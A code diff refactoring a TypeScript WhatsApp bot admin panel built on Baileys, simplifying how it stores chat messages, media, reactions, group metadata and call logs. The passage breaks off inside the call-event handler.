@@ -12,7 +12,7 @@ import { pathToFileURL } from "node:url";
 
 const execAsync = promisify(exec);
 
-interface ChatMessageItem {
+interface ChatMsg {
   id: string;
   sender: string;
   pushName: string;
@@ -22,45 +22,42 @@ interface ChatMessageItem {
   fromMe: boolean;
   mediaType?: "image" | "sticker" | "video" | "audio" | "document" | null;
   mediaMime?: string;
-  hasMedia?: boolean;
   quotedId?: string;
   quotedSender?: string;
   quotedText?: string;
-  reactions?: Record<string, string>;
+  reactions: Record<string, string>;
   rawKey?: any;
   rawMessage?: any;
   mediaNode?: any;
 }
 
-interface ChatSessionItem {
+interface ChatSession {
   jid: string;
   name: string;
   isGroup: boolean;
   unread: number;
   lastTime: number;
   lastPreview: string;
-  avatarUrl?: string | null;
+  avatarUrl?: string;
   statusText?: string;
-  messages: ChatMessageItem[];
+  messages: ChatMsg[];
 }
 
-interface CallLogItem {
+interface CallLog {
   id: string;
   botKey: string;
   peerJid: string;
   peerName: string;
   isVideo: boolean;
-  isGroup: boolean;
   direction: "incoming" | "outgoing";
   status: string;
   timestamp: number;
   timeStr: string;
 }
 
-interface MediaBufferItem {
+interface MediaItem {
   mime: string;
   buffer: Buffer;
-  createdAt: number;
 }
 
 interface ReportRecord {
@@ -70,7 +67,7 @@ interface ReportRecord {
   lastTimestamp: string;
 }
 
-interface WebPanelState {
+interface PanelState {
   server: http.Server | null;
   port: number;
   token: string;
@@ -89,22 +86,22 @@ interface WebPanelState {
   hookedSockets: WeakSet<object>;
   originalSenders: WeakMap<object, (...args: any[]) => Promise<any>>;
   reportRegistry: Map<string, ReportRecord>;
-  botChatStores: Map<string, Map<string, ChatSessionItem>>;
+  botChatStores: Map<string, Map<string, ChatSession>>;
   botGroupSynced: Set<string>;
   botGroupSyncing: Set<string>;
-  mediaStore: Map<string, MediaBufferItem>;
+  mediaStore: Map<string, MediaItem>;
   thumbStore: Map<string, Buffer>;
-  mediaDownloading: Map<string, Promise<MediaBufferItem | null>>;
-  msgLookup: Map<string, { botKey: string; msg: ChatMessageItem }>;
+  mediaDownloading: Map<string, Promise<MediaItem | null>>;
+  msgLookup: Map<string, { botKey: string; msg: ChatMsg }>;
   avatarCache: Map<string, string>;
   avatarPending: Set<string>;
-  callLogs: CallLogItem[];
+  callLogs: CallLog[];
   autoRejectCalls: boolean;
   autoRejectMessage: string;
   lastSock: any;
 }
 
-const gState = globalThis as unknown as { __auraWebPanel?: WebPanelState };
+const gState = globalThis as unknown as { __auraWebPanel?: PanelState };
 
 if (!gState.__auraWebPanel) {
   gState.__auraWebPanel = {
@@ -120,8 +117,8 @@ if (!gState.__auraWebPanel) {
     msgRx: 0,
     msgTx: 0,
     subbotsPaused: false,
-    pausedBotIds: new Set<string>(),
-    blockedCommands: new Set<string>(),
+    pausedBotIds: new Set(),
+    blockedCommands: new Set(),
     wrappedCommands: new Map(),
     hookedSockets: new WeakSet(),
     originalSenders: new WeakMap(),
@@ -137,60 +134,56 @@ if (!gState.__auraWebPanel) {
     avatarPending: new Set(),
     callLogs: [],
     autoRejectCalls: false,
-    autoRejectMessage: "⚠️ No puedo responder llamadas en este momento. Envíame un mensaje de texto.",
+    autoRejectMessage: "⚠️ No puedo responder llamadas en este momento. Envíame un mensaje.",
     lastSock: null,
   };
 }
 
 const state = gState.__auraWebPanel!;
+state.pausedBotIds ??= new Set();
+state.botChatStores ??= new Map();
+state.botGroupSynced ??= new Set();
+state.botGroupSyncing ??= new Set();
+state.reportRegistry ??= new Map();
+state.mediaStore ??= new Map();
+state.thumbStore ??= new Map();
+state.mediaDownloading ??= new Map();
+state.msgLookup ??= new Map();
+state.avatarCache ??= new Map();
+state.avatarPending ??= new Set();
+state.callLogs ??= [];
 
-if (!state.pausedBotIds) state.pausedBotIds = new Set<string>();
-if (!state.botChatStores) state.botChatStores = new Map();
-if (!state.botGroupSynced) state.botGroupSynced = new Set();
-if (!state.botGroupSyncing) state.botGroupSyncing = new Set();
-if (!state.reportRegistry) state.reportRegistry = new Map();
-if (!state.mediaStore) state.mediaStore = new Map();
-if (!state.thumbStore) state.thumbStore = new Map();
-if (!state.mediaDownloading) state.mediaDownloading = new Map();
-if (!state.msgLookup) state.msgLookup = new Map();
-if (!state.avatarCache) state.avatarCache = new Map();
-if (!state.avatarPending) state.avatarPending = new Set();
-if (!state.callLogs) state.callLogs = [];
-if (state.autoRejectCalls === undefined) state.autoRejectCalls = false;
-if (!state.autoRejectMessage) {
-  state.autoRejectMessage = "⚠️ No puedo responder llamadas en este momento. Envíame un mensaje de texto.";
-}
-
-let cachedBaileysMod: any = null;
-async function getBaileysModule(): Promise<any> {
-  if (cachedBaileysMod) return cachedBaileysMod;
+let baileysMod: any = null;
+async function getBaileys() {
+  if (baileysMod) return baileysMod;
   try {
-    cachedBaileysMod = await import("baileys");
-    return cachedBaileysMod;
-  } catch {}
-  try {
-    cachedBaileysMod = await import("@whiskeysockets/baileys");
-    return cachedBaileysMod;
-  } catch {}
-  return null;
-}
-
-function saveMediaToStore(id: string, mime: string, buffer: Buffer) {
-  if (!id || !buffer || !buffer.length) return;
-  state.mediaStore.set(id, { mime, buffer, createdAt: Date.now() });
-  if (state.mediaStore.size > 120) {
-    const oldestKey = state.mediaStore.keys().next().value;
-    if (oldestKey) state.mediaStore.delete(oldestKey);
+    return (baileysMod = await import("baileys"));
+  } catch {
+    try {
+      return (baileysMod = await import("@whiskeysockets/baileys"));
+    } catch {
+      return null;
+    }
   }
 }
 
-function saveThumbToStore(id: string, buffer: Buffer) {
-  if (!id || !buffer || !buffer.length) return;
+function capMap<K, V>(map: Map<K, V>, limit: number) {
+  if (map.size > limit) {
+    const first = map.keys().next().value;
+    if (first !== undefined) map.delete(first);
+  }
+}
+
+function saveMedia(id: string, mime: string, buffer: Buffer) {
+  if (!id || !buffer?.length) return;
+  state.mediaStore.set(id, { mime, buffer });
+  capMap(state.mediaStore, 110);
+}
+
+function saveThumb(id: string, buffer: Buffer) {
+  if (!id || !buffer?.length) return;
   state.thumbStore.set(id, buffer);
-  if (state.thumbStore.size > 250) {
-    const oldestKey = state.thumbStore.keys().next().value;
-    if (oldestKey) state.thumbStore.delete(oldestKey);
-  }
+  capMap(state.thumbStore, 240);
 }
 
 function rotateCredentials() {
@@ -199,205 +192,142 @@ function rotateCredentials() {
   state.tempPass = String(Math.floor(100000 + Math.random() * 900000));
 }
 
-function getBotKey(botSock: any, fallbackIndex = 0): string {
-  const raw = botSock?.user?.id || `bot_${fallbackIndex}`;
-  return String(raw).split("@")[0].split(":")[0] || `bot_${fallbackIndex}`;
-}
+const cleanId = (val: any) => String(val || "").split("@")[0].split(":")[0];
+const getBotKey = (sock: any, idx = 0) => cleanId(sock?.user?.id) || `bot_${idx}`;
+const nowTime = (ts = Date.now()) => new Date(ts).toLocaleTimeString("es-CO", { hour: "2-digit", minute: "2-digit" });
 
-function ensureBotChatMap(botKey: string): Map<string, ChatSessionItem> {
-  if (!state.botChatStores.has(botKey)) {
-    state.botChatStores.set(botKey, new Map());
-  }
+function getChatStore(botKey: string): Map<string, ChatSession> {
+  if (!state.botChatStores.has(botKey)) state.botChatStores.set(botKey, new Map());
   return state.botChatStores.get(botKey)!;
 }
 
-function unwrapMessage(msgObj: any): any {
-  if (!msgObj) return null;
+function getAllSockets(mainSock?: any): any[] {
+  const base = mainSock || state.lastSock;
+  let subs: any[] = [];
+  try {
+    subs = getActiveSubBots?.() || [];
+  } catch {}
+  const seen = new Set<any>();
+  return [base, ...subs].filter((s) => s && !seen.has(s) && seen.add(s));
+}
+
+function findBot(botKey: string) {
+  const all = getAllSockets();
+  const idx = all.findIndex((b, i) => getBotKey(b, i) === botKey);
+  return { bot: idx >= 0 ? all[idx] : all[0], idx: Math.max(0, idx), all };
+}
+
+function unwrapMsg(m: any): any {
+  if (!m) return null;
   return (
-    msgObj.ephemeralMessage?.message ||
-    msgObj.viewOnceMessage?.message ||
-    msgObj.viewOnceMessageV2?.message ||
-    msgObj.viewOnceMessageV2Extension?.message ||
-    msgObj.documentWithCaptionMessage?.message ||
-    msgObj
+    m.ephemeralMessage?.message ||
+    m.viewOnceMessage?.message ||
+    m.viewOnceMessageV2?.message ||
+    m.viewOnceMessageV2Extension?.message ||
+    m.documentWithCaptionMessage?.message ||
+    m
   );
 }
 
-function extractMessageDetails(msgObj: any): {
-  text: string;
-  mediaType: "image" | "sticker" | "video" | "audio" | "document" | null;
-  mediaMime: string;
-  mediaNode: any;
-  thumbBuffer: Buffer | null;
-  quotedId: string;
-  quotedSender: string;
-  quotedText: string;
-} {
-  const empty = {
+function parseMsgContent(raw: any) {
+  const m = unwrapMsg(raw);
+  const res = {
     text: "",
-    mediaType: null as any,
+    mediaType: null as ChatMsg["mediaType"],
     mediaMime: "",
-    mediaNode: null,
-    thumbBuffer: null as Buffer | null,
+    mediaNode: null as any,
+    thumb: null as Buffer | null,
     quotedId: "",
     quotedSender: "",
     quotedText: "",
   };
-  const m = unwrapMessage(msgObj);
-  if (!m) return empty;
+  if (!m) return res;
 
-  const ctxInfo =
+  const ctx =
     m.extendedTextMessage?.contextInfo ||
     m.imageMessage?.contextInfo ||
     m.videoMessage?.contextInfo ||
     m.stickerMessage?.contextInfo ||
     m.audioMessage?.contextInfo ||
-    m.documentMessage?.contextInfo ||
-    null;
+    m.documentMessage?.contextInfo;
 
-  let quotedId = "";
-  let quotedSender = "";
-  let quotedText = "";
-
-  if (ctxInfo?.quotedMessage) {
-    quotedId = ctxInfo.stanzaId || "";
-    quotedSender = String(ctxInfo.participant || "").split("@")[0].split(":")[0];
-    const qUnwrapped = unwrapMessage(ctxInfo.quotedMessage);
-    quotedText =
-      qUnwrapped?.conversation ||
-      qUnwrapped?.extendedTextMessage?.text ||
-      qUnwrapped?.imageMessage?.caption ||
-      (qUnwrapped?.imageMessage ? "📷 Imagen" : "") ||
-      (qUnwrapped?.stickerMessage ? "🏷️ Sticker" : "") ||
-      (qUnwrapped?.audioMessage ? "🎤 Audio" : "") ||
-      (qUnwrapped?.videoMessage ? "🎥 Video" : "") ||
-      "[Mensaje citado]";
+  if (ctx?.quotedMessage) {
+    res.quotedId = ctx.stanzaId || "";
+    res.quotedSender = cleanId(ctx.participant);
+    const q = unwrapMsg(ctx.quotedMessage);
+    res.quotedText =
+      q?.conversation ||
+      q?.extendedTextMessage?.text ||
+      q?.imageMessage?.caption ||
+      (q?.imageMessage ? "📷 Imagen" : q?.stickerMessage ? "🏷️ Sticker" : q?.videoMessage ? "🎥 Video" : q?.audioMessage ? "🎤 Audio" : "[Cita]");
   }
 
-  if (typeof m.conversation === "string" && m.conversation) {
-    return { ...empty, text: m.conversation, quotedId, quotedSender, quotedText };
-  }
-  if (typeof m.extendedTextMessage?.text === "string" && m.extendedTextMessage.text) {
-    return { ...empty, text: m.extendedTextMessage.text, quotedId, quotedSender, quotedText };
-  }
-  if (m.imageMessage) {
-    const thumb = m.imageMessage.jpegThumbnail ? Buffer.from(m.imageMessage.jpegThumbnail) : null;
-    return {
-      text: m.imageMessage.caption || "",
-      mediaType: "image",
-      mediaMime: m.imageMessage.mimetype || "image/jpeg",
-      mediaNode: m.imageMessage,
-      thumbBuffer: thumb,
-      quotedId,
-      quotedSender,
-      quotedText,
-    };
-  }
-  if (m.stickerMessage) {
-    return {
-      text: "",
-      mediaType: "sticker",
-      mediaMime: m.stickerMessage.mimetype || "image/webp",
-      mediaNode: m.stickerMessage,
-      thumbBuffer: null,
-      quotedId,
-      quotedSender,
-      quotedText,
-    };
-  }
-  if (m.videoMessage) {
-    const thumb = m.videoMessage.jpegThumbnail ? Buffer.from(m.videoMessage.jpegThumbnail) : null;
-    return {
-      text: m.videoMessage.caption || "",
-      mediaType: "video",
-      mediaMime: m.videoMessage.mimetype || "video/mp4",
-      mediaNode: m.videoMessage,
-      thumbBuffer: thumb,
-      quotedId,
-      quotedSender,
-      quotedText,
-    };
-  }
-  if (m.audioMessage) {
-    return {
-      text: m.audioMessage.ptt ? "🎤 Nota de voz" : "🎵 Audio",
-      mediaType: "audio",
-      mediaMime: m.audioMessage.mimetype || "audio/ogg; codecs=opus",
-      mediaNode: m.audioMessage,
-      thumbBuffer: null,
-      quotedId,
-      quotedSender,
-      quotedText,
-    };
-  }
-  if (m.documentMessage) {
-    return {
-      text: `📄 ${m.documentMessage.fileName || "Documento"}`,
-      mediaType: "document",
-      mediaMime: m.documentMessage.mimetype || "application/octet-stream",
-      mediaNode: m.documentMessage,
-      thumbBuffer: null,
-      quotedId,
-      quotedSender,
-      quotedText,
-    };
-  }
-  if (m.contactMessage) {
-    return { ...empty, text: `👤 Contacto: ${m.contactMessage.displayName || ""}` };
-  }
-  if (m.locationMessage) {
-    return { ...empty, text: `📍 Ubicación (${m.locationMessage.degreesLatitude}, ${m.locationMessage.degreesLongitude})` };
-  }
-  if (m.pollCreationMessage || m.pollCreationMessageV2 || m.pollCreationMessageV3) {
-    const poll = m.pollCreationMessage || m.pollCreationMessageV2 || m.pollCreationMessageV3;
-    return { ...empty, text: `📊 Encuesta: ${poll.name || ""}` };
-  }
-  if (m.interactiveMessage || m.buttonsMessage || m.templateMessage) {
-    return { ...empty, text: "🎛️ [Mensaje Interactivo]" };
-  }
-  return empty;
+  if (typeof m.conversation === "string" && m.conversation) res.text = m.conversation;
+  else if (m.extendedTextMessage?.text) res.text = m.extendedTextMessage.text;
+  else if (m.imageMessage) {
+    res.text = m.imageMessage.caption || "";
+    res.mediaType = "image";
+    res.mediaMime = m.imageMessage.mimetype || "image/jpeg";
+    res.mediaNode = m.imageMessage;
+    if (m.imageMessage.jpegThumbnail) res.thumb = Buffer.from(m.imageMessage.jpegThumbnail);
+  } else if (m.stickerMessage) {
+    res.mediaType = "sticker";
+    res.mediaMime = m.stickerMessage.mimetype || "image/webp";
+    res.mediaNode = m.stickerMessage;
+  } else if (m.videoMessage) {
+    res.text = m.videoMessage.caption || "";
+    res.mediaType = "video";
+    res.mediaMime = m.videoMessage.mimetype || "video/mp4";
+    res.mediaNode = m.videoMessage;
+    if (m.videoMessage.jpegThumbnail) res.thumb = Buffer.from(m.videoMessage.jpegThumbnail);
+  } else if (m.audioMessage) {
+    res.text = m.audioMessage.ptt ? "🎤 Nota de voz" : "🎵 Audio";
+    res.mediaType = "audio";
+    res.mediaMime = m.audioMessage.mimetype || "audio/ogg; codecs=opus";
+    res.mediaNode = m.audioMessage;
+  } else if (m.documentMessage) {
+    res.text = `📄 ${m.documentMessage.fileName || "Documento"}`;
+    res.mediaType = "document";
+    res.mediaMime = m.documentMessage.mimetype || "application/octet-stream";
+    res.mediaNode = m.documentMessage;
+  } else if (m.contactMessage) res.text = `👤 ${m.contactMessage.displayName || "Contacto"}`;
+  else if (m.locationMessage) res.text = `📍 Ubicación (${m.locationMessage.degreesLatitude}, ${m.locationMessage.degreesLongitude})`;
+  else if (m.pollCreationMessage || m.pollCreationMessageV2 || m.pollCreationMessageV3) {
+    const p = m.pollCreationMessage || m.pollCreationMessageV2 || m.pollCreationMessageV3;
+    res.text = `📊 Encuesta: ${p.name || ""}`;
+  } else if (m.interactiveMessage || m.buttonsMessage || m.templateMessage) res.text = "🎛️ [Interactivo]";
+
+  return res;
 }
 
-async function downloadMediaBuffer(
+async function fetchMediaBuffer(
   botSock: any,
   fullMsg: any,
   msgId: string,
-  mediaType: "image" | "sticker" | "video" | "audio" | "document",
+  mediaType: NonNullable<ChatMsg["mediaType"]>,
   mediaMime: string,
   mediaNode: any
-): Promise<MediaBufferItem | null> {
-  if (state.mediaStore.has(msgId)) {
-    return state.mediaStore.get(msgId)!;
-  }
-  if (state.mediaDownloading.has(msgId)) {
-    return state.mediaDownloading.get(msgId)!;
-  }
+): Promise<MediaItem | null> {
+  if (state.mediaStore.has(msgId)) return state.mediaStore.get(msgId)!;
+  if (state.mediaDownloading.has(msgId)) return state.mediaDownloading.get(msgId)!;
 
-  const task = (async (): Promise<MediaBufferItem | null> => {
+  const task = (async (): Promise<MediaItem | null> => {
     try {
-      const bMod = await getBaileysModule();
-      if (bMod && typeof bMod.downloadContentFromMessage === "function" && mediaNode) {
-        const dlType = mediaType === "sticker" ? "sticker" : mediaType;
-        const stream = await bMod.downloadContentFromMessage(mediaNode, dlType);
+      const b = await getBaileys();
+      if (b?.downloadContentFromMessage && mediaNode) {
+        const stream = await b.downloadContentFromMessage(mediaNode, mediaType === "sticker" ? "sticker" : mediaType);
         const chunks: Buffer[] = [];
-        for await (const chunk of stream) {
-          chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
-        }
+        for await (const c of stream) chunks.push(Buffer.isBuffer(c) ? c : Buffer.from(c));
         const buf = Buffer.concat(chunks);
-        if (buf.length > 0) {
-          saveMediaToStore(msgId, mediaMime, buf);
+        if (buf.length) {
+          saveMedia(msgId, mediaMime, buf);
           return state.mediaStore.get(msgId) || null;
         }
       }
-      if (bMod && typeof bMod.downloadMediaMessage === "function" && fullMsg) {
-        const buf = await bMod.downloadMediaMessage(
-          fullMsg,
-          "buffer",
-          {},
-          { logger: undefined, reuploadRequest: botSock?.updateMediaMessage }
-        );
-        if (Buffer.isBuffer(buf) && buf.length > 0) {
-          saveMediaToStore(msgId, mediaMime, buf);
+      if (b?.downloadMediaMessage && fullMsg) {
+        const buf = await b.downloadMediaMessage(fullMsg, "buffer", {}, { logger: undefined, reuploadRequest: botSock?.updateMediaMessage });
+        if (Buffer.isBuffer(buf) && buf.length) {
+          saveMedia(msgId, mediaMime, buf);
           return state.mediaStore.get(msgId) || null;
         }
       }
@@ -413,10 +343,10 @@ async function downloadMediaBuffer(
   }
 }
 
-function recordChatMessage(
+function recordChatMsg(
   botKey: string,
   remoteJid: string,
-  msgData: {
+  data: {
     id: string;
     sender: string;
     pushName: string;
@@ -424,9 +354,8 @@ function recordChatMessage(
     fromMe: boolean;
     chatName?: string;
     timestamp?: number;
-    mediaType?: "image" | "sticker" | "video" | "audio" | "document" | null;
+    mediaType?: ChatMsg["mediaType"];
     mediaMime?: string;
-    hasMedia?: boolean;
     quotedId?: string;
     quotedSender?: string;
     quotedText?: string;
@@ -435,134 +364,90 @@ function recordChatMessage(
     mediaNode?: any;
   }
 ) {
-  if (!remoteJid || remoteJid === "status@broadcast") return;
-  if (!msgData.text && !msgData.mediaType) return;
-
-  const store = ensureBotChatMap(botKey);
+  if (!remoteJid || remoteJid === "status@broadcast" || (!data.text && !data.mediaType)) return;
+  const store = getChatStore(botKey);
   const isGroup = remoteJid.endsWith("@g.us");
-  const cleanRemote = remoteJid.split("@")[0].split(":")[0];
-  const nowTs = msgData.timestamp || Date.now();
-  const timeStr = new Date(nowTs).toLocaleTimeString("es-CO", {
-    hour: "2-digit",
-    minute: "2-digit",
-  });
+  const clean = cleanId(remoteJid);
+  const ts = data.timestamp || Date.now();
 
-  const previewLabel =
-    msgData.mediaType === "sticker"
+  const preview =
+    data.mediaType === "sticker"
       ? "🏷️ Sticker"
-      : msgData.mediaType === "image"
-      ? `📷 ${msgData.text || "Foto"}`
-      : msgData.mediaType === "video"
-      ? `🎥 ${msgData.text || "Video"}`
-      : msgData.mediaType === "audio"
+      : data.mediaType === "image"
+      ? `📷 ${data.text || "Foto"}`
+      : data.mediaType === "video"
+      ? `🎥 ${data.text || "Video"}`
+      : data.mediaType === "audio"
       ? "🎤 Audio"
-      : msgData.text;
+      : data.text;
 
-  let session = store.get(remoteJid);
-  if (!session) {
-    session = {
+  let chat = store.get(remoteJid);
+  if (!chat) {
+    chat = {
       jid: remoteJid,
-      name: msgData.chatName || (isGroup ? `Grupo ${cleanRemote}` : msgData.pushName || `+${cleanRemote}`),
+      name: data.chatName || (isGroup ? `Grupo ${clean}` : data.pushName || `+${clean}`),
       isGroup,
       unread: 0,
-      lastTime: nowTs,
-      lastPreview: previewLabel.slice(0, 70),
+      lastTime: ts,
+      lastPreview: preview.slice(0, 70),
       messages: [],
     };
-    store.set(remoteJid, session);
-  } else {
-    if (msgData.chatName && (session.name.startsWith("Grupo ") || session.name.startsWith("+"))) {
-      session.name = msgData.chatName;
-    } else if (!isGroup && !msgData.fromMe && msgData.pushName && session.name.startsWith("+")) {
-      session.name = msgData.pushName;
-    }
+    store.set(remoteJid, chat);
+  } else if (!isGroup && !data.fromMe && data.pushName && chat.name.startsWith("+")) {
+    chat.name = data.pushName;
   }
 
-  const existingMsg = session.messages.find((x) => x.id === msgData.id);
-  if (existingMsg) {
-    if (msgData.hasMedia) existingMsg.hasMedia = true;
-    return;
-  }
+  if (chat.messages.some((x) => x.id === data.id)) return;
 
-  session.lastTime = nowTs;
-  session.lastPreview = previewLabel.slice(0, 70);
-  if (!msgData.fromMe) {
-    session.unread = Math.min(999, session.unread + 1);
-  }
+  chat.lastTime = ts;
+  chat.lastPreview = preview.slice(0, 70);
+  if (!data.fromMe) chat.unread = Math.min(999, chat.unread + 1);
 
-  const item: ChatMessageItem = {
-    id: msgData.id,
-    sender: msgData.sender,
-    pushName: msgData.pushName,
-    text: msgData.text,
-    time: timeStr,
-    timestamp: nowTs,
-    fromMe: msgData.fromMe,
-    mediaType: msgData.mediaType || null,
-    mediaMime: msgData.mediaMime || "",
-    hasMedia: Boolean(msgData.hasMedia || msgData.mediaType),
-    quotedId: msgData.quotedId || "",
-    quotedSender: msgData.quotedSender || "",
-    quotedText: msgData.quotedText || "",
+  const item: ChatMsg = {
+    id: data.id,
+    sender: data.sender,
+    pushName: data.pushName,
+    text: data.text,
+    time: nowTime(ts),
+    timestamp: ts,
+    fromMe: data.fromMe,
+    mediaType: data.mediaType || null,
+    mediaMime: data.mediaMime || "",
+    quotedId: data.quotedId || "",
+    quotedSender: data.quotedSender || "",
+    quotedText: data.quotedText || "",
     reactions: {},
-    rawKey: msgData.rawKey,
-    rawMessage: msgData.rawMessage,
-    mediaNode: msgData.mediaNode,
+    rawKey: data.rawKey,
+    rawMessage: data.rawMessage,
+    mediaNode: data.mediaNode,
   };
 
-  session.messages.push(item);
+  chat.messages.push(item);
   state.msgLookup.set(item.id, { botKey, msg: item });
-  if (state.msgLookup.size > 800) {
-    const firstKey = state.msgLookup.keys().next().value;
-    if (firstKey) state.msgLookup.delete(firstKey);
-  }
-
-  if (session.messages.length > 150) {
-    session.messages.splice(0, session.messages.length - 150);
-  }
+  capMap(state.msgLookup, 700);
+  if (chat.messages.length > 140) chat.messages.splice(0, chat.messages.length - 140);
 }
 
-function getAllBotSockets(mainSock?: any): any[] {
-  const base = mainSock || state.lastSock;
-  let subs: any[] = [];
-  try {
-    if (typeof getActiveSubBots === "function") {
-      subs = getActiveSubBots() || [];
-    }
-  } catch {
-    subs = [];
-  }
-  const combined = [base, ...subs].filter(Boolean);
-  const seen = new Set<any>();
-  return combined.filter((s) => {
-    if (seen.has(s)) return false;
-    seen.add(s);
-    return true;
-  });
-}
-
-function triggerBackgroundGroupSync(botSock: any, idx: number, force = false) {
+function syncGroupsBg(botSock: any, idx: number, force = false) {
   const botKey = getBotKey(botSock, idx);
-  if (!force && state.botGroupSynced.has(botKey)) return;
-  if (state.botGroupSyncing.has(botKey)) return;
-
+  if ((!force && state.botGroupSynced.has(botKey)) || state.botGroupSyncing.has(botKey)) return;
   state.botGroupSyncing.add(botKey);
-  const store = ensureBotChatMap(botKey);
+  const store = getChatStore(botKey);
 
   if (botSock?.chats && typeof botSock.chats === "object") {
     try {
-      const entries = botSock.chats instanceof Map ? Array.from(botSock.chats.entries()) : Object.entries(botSock.chats);
-      for (const [jid, cObj] of entries as Array<[string, any]>) {
+      const list = botSock.chats instanceof Map ? Array.from(botSock.chats.entries()) : Object.entries(botSock.chats);
+      for (const [jid, c] of list as Array<[string, any]>) {
         if (!jid || jid === "status@broadcast" || store.has(jid)) continue;
         const isG = jid.endsWith("@g.us");
-        const clean = jid.split("@")[0].split(":")[0];
+        const cl = cleanId(jid);
         store.set(jid, {
           jid,
-          name: cObj?.name || cObj?.subject || (isG ? `Grupo ${clean}` : `+${clean}`),
+          name: c?.name || c?.subject || (isG ? `Grupo ${cl}` : `+${cl}`),
           isGroup: isG,
-          unread: Number(cObj?.unreadCount || 0),
-          lastTime: Number(cObj?.conversationTimestamp || Date.now() - 120000),
-          lastPreview: isG ? "👥 Grupo sincronizado" : "💬 Chat activo",
+          unread: Number(c?.unreadCount || 0),
+          lastTime: Number(c?.conversationTimestamp || Date.now() - 120000),
+          lastPreview: isG ? "👥 Grupo" : "💬 Chat",
           messages: [],
         });
       }
@@ -572,15 +457,15 @@ function triggerBackgroundGroupSync(botSock: any, idx: number, force = false) {
   if (typeof botSock?.groupFetchAllParticipating === "function") {
     Promise.race([
       botSock.groupFetchAllParticipating(),
-      new Promise((_, rej) => setTimeout(() => rej(new Error("timeout")), 5000)),
+      new Promise((_, r) => setTimeout(() => r(new Error("timeout")), 4500)),
     ])
       .then((groups: any) => {
         for (const [jid, meta] of Object.entries(groups || {}) as Array<[string, any]>) {
-          const existing = store.get(jid);
-          if (!existing) {
+          const ex = store.get(jid);
+          if (!ex) {
             store.set(jid, {
               jid,
-              name: meta?.subject || `Grupo ${jid.split("@")[0]}`,
+              name: meta?.subject || `Grupo ${cleanId(jid)}`,
               isGroup: true,
               unread: 0,
               lastTime: meta?.creation ? Number(meta.creation) * 1000 : Date.now() - 86400000,
@@ -589,16 +474,14 @@ function triggerBackgroundGroupSync(botSock: any, idx: number, force = false) {
               messages: [],
             });
           } else {
-            if (meta?.subject) existing.name = meta.subject;
-            if (meta?.desc) existing.statusText = String(meta.desc).slice(0, 120);
+            if (meta?.subject) ex.name = meta.subject;
+            if (meta?.desc) ex.statusText = String(meta.desc).slice(0, 120);
           }
         }
         state.botGroupSynced.add(botKey);
       })
       .catch(() => {})
-      .finally(() => {
-        state.botGroupSyncing.delete(botKey);
-      });
+      .finally(() => state.botGroupSyncing.delete(botKey));
   } else {
     state.botGroupSynced.add(botKey);
     state.botGroupSyncing.delete(botKey);
@@ -607,221 +490,164 @@ function triggerBackgroundGroupSync(botSock: any, idx: number, force = false) {
 
 function hookSockets(mainSock?: any) {
   if (mainSock) state.lastSock = mainSock;
-  const sockets = getAllBotSockets(mainSock);
-
-  sockets.forEach((botSock, index) => {
+  getAllSockets(mainSock).forEach((botSock, idx) => {
     if (!botSock || typeof botSock !== "object") return;
-    const botKey = getBotKey(botSock, index);
-    ensureBotChatMap(botKey);
+    getChatStore(getBotKey(botSock, idx));
+    if (state.hookedSockets.has(botSock)) return;
+    state.hookedSockets.add(botSock);
+    syncGroupsBg(botSock, idx);
 
-    if (!state.hookedSockets.has(botSock)) {
-      state.hookedSockets.add(botSock);
-      triggerBackgroundGroupSync(botSock, index);
+    if (typeof botSock.ev?.on === "function") {
+      botSock.ev.on("messages.upsert", ({ messages }: any) => {
+        if (!Array.isArray(messages)) return;
+        const curKey = getBotKey(botSock, idx);
+        for (const m of messages) {
+          if (!m?.message) continue;
+          if (m.message.reactionMessage) {
+            const r = m.message.reactionMessage;
+            const tMsg = getChatStore(curKey).get(r.key?.remoteJid || m.key?.remoteJid)?.messages.find((x) => x.id === r.key?.id);
+            if (tMsg) {
+              const who = cleanId(m.key?.participant || m.key?.remoteJid || "user");
+              if (r.text) tMsg.reactions[who] = r.text;
+              else delete tMsg.reactions[who];
+            }
+            continue;
+          }
 
-      if (botSock.ev && typeof botSock.ev.on === "function") {
-        botSock.ev.on("messages.upsert", ({ messages }: any) => {
-          if (!Array.isArray(messages)) return;
-          const currentKey = getBotKey(botSock, index);
-          for (const m of messages) {
-            if (!m?.message) continue;
+          const fromMe = Boolean(m.key?.fromMe);
+          if (fromMe) state.msgTx++;
+          else state.msgRx++;
 
-            if (m.message.reactionMessage) {
-              const reactObj = m.message.reactionMessage;
-              const targetId = reactObj.key?.id;
-              const rJid = reactObj.key?.remoteJid || m.key?.remoteJid;
-              const emoji = reactObj.text || "";
-              const reactor = String(m.key?.participant || m.key?.remoteJid || "user").split("@")[0];
-              if (rJid && targetId) {
-                const chat = ensureBotChatMap(currentKey).get(rJid);
-                const targetMsg = chat?.messages.find((x) => x.id === targetId);
-                if (targetMsg) {
-                  if (!targetMsg.reactions) targetMsg.reactions = {};
-                  if (emoji) targetMsg.reactions[reactor] = emoji;
-                  else delete targetMsg.reactions[reactor];
-                }
+          const remoteJid = m.key?.remoteJid || "";
+          const senderNum = cleanId(m.key?.participant || (fromMe ? botSock?.user?.id : remoteJid));
+          const pushName = fromMe ? botSock?.user?.name || "Bot" : m.pushName || `+${senderNum}`;
+          const msgId = m.key?.id || randomBytes(6).toString("hex");
+          const ts = typeof m.messageTimestamp === "number" ? m.messageTimestamp * 1000 : Date.now();
+          const parsed = parseMsgContent(m.message);
+          if (!parsed.text && !parsed.mediaType) continue;
+
+          if (parsed.thumb) saveThumb(msgId, parsed.thumb);
+          if (parsed.mediaType) {
+            fetchMediaBuffer(botSock, m, msgId, parsed.mediaType, parsed.mediaMime, parsed.mediaNode).catch(() => {});
+          }
+
+          recordChatMsg(curKey, remoteJid, {
+            id: msgId,
+            sender: senderNum,
+            pushName,
+            text: parsed.text,
+            fromMe,
+            timestamp: ts,
+            mediaType: parsed.mediaType,
+            mediaMime: parsed.mediaMime,
+            quotedId: parsed.quotedId,
+            quotedSender: parsed.quotedSender,
+            quotedText: parsed.quotedText,
+            rawKey: m.key,
+            rawMessage: m,
+            mediaNode: parsed.mediaNode,
+          });
+        }
+      });
+
+      botSock.ev.on("call", async (calls: any[]) => {
+        if (!Array.isArray(calls)) return;
+        const curKey = getBotKey(botSock, idx);
+        for (const c of calls) {
+          const callId = String(c.id || randomBytes(4).toString("hex"));
+          const peerJid = String(c.from || c.chatId || "");
+          const cleanPeer = cleanId(peerJid);
+          const status = String(c.status || "offer");
+          const isVideo = Boolean(c.isVideo);
+          const now = Date.now();
